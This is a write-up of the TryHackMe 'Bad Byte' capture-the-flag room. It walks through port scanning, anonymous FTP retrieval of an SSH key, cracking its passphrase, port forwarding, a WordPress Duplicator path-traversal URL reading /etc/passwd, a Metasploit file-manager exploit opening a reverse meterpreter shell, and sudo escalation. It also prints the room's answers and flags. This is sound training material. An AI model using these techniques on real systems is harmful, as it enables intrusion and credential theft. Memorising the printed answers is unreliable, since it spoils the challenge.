# Bad Byte

## Tl;dr&#x20;

**An easy machine from tryhackme that covers basic port scanning, cracking ssh passwords, ssh port forwading**

![e10efbdae42b02a75d412d843705cb56](https://user-images.githubusercontent.com/56447720/151287313-aca38656-6801-4944-bed8-ba4d5d8f0d17.png)

### Reconnaissance

* I've used rustscan for the scan

```bash
└─$ rustscan -a 10.10.184.227 -- -sC -sV

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/devcli3nt/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.184.227:22
Open 10.10.184.227:30024
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")


PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9/A7kkuN5E+SS1C6w1NfeY196Rj4Y1Yx7njNCwNaCgIv8m+V+7MTHsRn3txLXRTHXErMqW3ypCmmjuY3O40kAragZSgA/XhdesGxGVa0szHK7H4fB28uQiyZgkOfIt/12kGaHB3iGwOeex2Hdg6ct4FdxTWKgDvuKZSLVoPXG66R8SOHql2cXfUtzyUMNJTTqoUED69soEJVG2ctfPKXi4BfFqM3OK2HgKzbmcSPXlLUTNhlcvjPuTa0kMRqiNTMVdP0PjSFdoaMviXHiznW7Fn6NHe3R/vIQt8Ac05Mdvim21QjRpJ4pm7v5+q1wXCJxGG6Ov71yThKP6yZ4ByMl
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9QUKykbzCSI7+PgoVzHNKOVIWf+zm0LN/f4n0VJc/P0J9TzLImkYHIOCnRFpNUPtiWGXbHXi67FQxEpgZMReo=
|   256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrvf1zJBhqU1RxUCYuTgoIy+7NzCqZeFWV67bt8+APV
30024/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds

```

#### Questions

* How many ports are open?

> 2

* What service is running on the lowest open port?

> ssh

* What non-standard port is open?

> 30024

* What service is running on the non-standard port?

> ftp

### Foothold

* Rustscan detected that anonymous login was enabled in FTP

```bash
└─$ ftp 10.10.184.227 30024     
Connected to 10.10.184.227.
220 (vsFTPd 3.0.3)
Name (10.10.184.227:devcli3nt): anonymous
331 Please specify the password.
Password:
230 Login successful.

```

* Geting all the files \[ mget\* ]

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
226 Directory send OK.
ftp> mget *
mget id_rsa? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
226 Transfer complete.
1743 bytes received in 0.00 secs (23.7465 MB/s)
mget note.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (78 bytes).
226 Transfer complete.
78 bytes received in 0.00 secs (1.5827 MB/s)

```

* Get username and password

```bash

└─$ cat note.txt 
I always forget my password. Just let me store an ssh key here.
- errorcauser


└─$ locate ssh2john
/usr/share/john/ssh2john.py
                                                                                                                                                      

└─$ /usr/share/john/ssh2john.py id_rsa > hashfile
                                                                                                                                                      

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashfile 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:22 DONE (2022-01-27 09:02) 0.04522g/s 648652p/s 648652c/s 648652C/sa6_123..*7¡Vamos!
Session completed

```

#### Questions

* What username do we find during the enumeration process?

> errorcauser

* What is the passphrase for the RSA private key?

> cupcake

### Port Forwarding

* Create a SSH port forward

```bash
└─$ ssh -i id_rsa -D 1337 errorcauser@10.10.184.227
 # After the connection change socks settings in proxychains
 
 └─$ sudo nano /etc/proxychains4.conf
 # socks5 127.0.0.1 1337
 
```

* Now run proxychains and nmap to get internal ports information

```bash
└─$ proxychains nmap -sT 127.0.0.1
   [proxychains] config file found: /etc/proxychains4.conf
   [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
   [proxychains] DLL init: proxychains-ng 4.15
   Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:29 IST
   [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
   [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:22  ...  OK
   [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:445 <--socket error or timeout!
   [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:8080 <--socket error or timeout!
   [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:3306  ...  OK
   [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK

<--SNIPPED-->
```

* Now connect the internal ports via ssh

```bash
└─$ ssh -L 80:127.0.0.1:80 errorcauser@10.10.184.227 -i id_rsa                                                                                  130 ⨯
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)
 
 <--SNIPPED-->
```

#### Questions

* What main TCP ports are listening on localhost?

> 80,3306

* What protocols are used for these ports?

> http,mysql

### Web Exploitation

* Scan port 80

```bash

└─$ nmap -p 80 127.0.0.1 -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:41 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.7
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: BadByte &#8211; You&#039;re looking at me, but they are lookin...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds

```

* Enumeration

```bash
└─$ nmap -p 80 --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1                                              1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:46 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00017s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
                                                                                                                                                      
```

* ABOUT DUPLICATOR VULN : `https://www.exploit-db.com/exploits/50420`
* Duplicator is basically LFI

> 127.0.0.1/wp-admin/admin-ajax.php?action=duplicator\_download\&file=../../../../../../../../etc/passwd

**User shell**

```bash
msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST 10.9.2.60
LHOST => 10.9.2.60
msf6 exploit(multi/http/wp_file_manager_rce) > run

[*] Started reverse TCP handler on 10.9.2.60:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/CMRdTO.php
[*] Sending stage (39282 bytes) to 10.10.184.227
[+] Deleted CMRdTO.php
[*] Meterpreter session 1 opened (10.9.2.60:4444 -> 10.10.184.227:58718) at 2021-05-03 19:42:28 +0200

```

#### Questions

* What CMS is running on the machine?

> wordpress

* What is the CVE number for directory traversal vulnerability?

> CVE-2020-11738

* What is the CVE number for remote code execution vulnerability?

> CVE-2020-25213

* What is the name of user that was running CMS?

> cth

\-What is the user flag?

> THM{227906201d17d9c45aa93d0122ea1af7}

### Privilege Escalation

* The old password was stored in `cat /var/log/bash.log` : \[ G00dP@$sw0rd2020 ]

```bash
cth@badbyte:/home$ sudo -l
sudo -l
[sudo] password for cth: G00dP@$sw0rd2021

Matching Defaults entries for cth on badbyte:
   env_reset, mail_badpass,
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cth may run the following commands on badbyte:
   (ALL : ALL) ALL
cth@badbyte:/home$ sudo -s
sudo -s

root@badbyte:~# cat root.txt
cat root.txt
 |      ______    ________   ________              ______        _____________ __________  |
 |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
 |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
 |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
 |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
 | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
 | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
 |                                  _________           __/   / /        \____________\/   |
 |                                 /________/\         /_____/ /                           |
 |                                 \________\/         \_____\/                            |

THM{ad485b44f63393b6a9225974909da5fa}

```

#### Questions

* What is the user's old password?

> G00dP@$sw0rd2020

* What is the root flag?

> THM{ad485b44f63393b6a9225974909da5fa}
